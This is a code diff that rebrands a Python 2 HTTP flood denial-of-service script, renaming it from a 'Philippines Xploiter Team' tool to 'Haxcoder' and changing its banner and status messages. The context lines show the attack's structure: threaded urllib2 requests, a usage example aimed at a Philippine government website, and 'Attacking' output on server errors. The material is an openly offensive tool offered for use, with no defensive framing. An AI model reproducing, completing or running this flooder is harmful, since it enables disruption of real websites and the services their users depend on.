@@ -1,10 +1,4 @@
-# ----------------------------------------------------------------------------------------------
-#DDos tools of Philippines Xploiter Team
-#
-#
-#
-# Philippines Xploiter Team
-# ----------------------------------------------------------------------------------------------
+
 import urllib2
 import sys
 import threading
@@ -68,7 +62,7 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: kojix.py <url> (ex. kojix.py http://www.gov.ph)'
+	print 'USAGE: HaxDDos.py <url> (ex. HaxDDos.py http://www.gov.ph)'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
@@ -95,7 +89,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Philipines Xploiter Team Attacking'
+			print 'Haxcoder Attacking'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -137,7 +131,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- Philippines Xploiter Team DDos tool Startted --"
+		print "-- Haxcoder DDos tool Startted --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
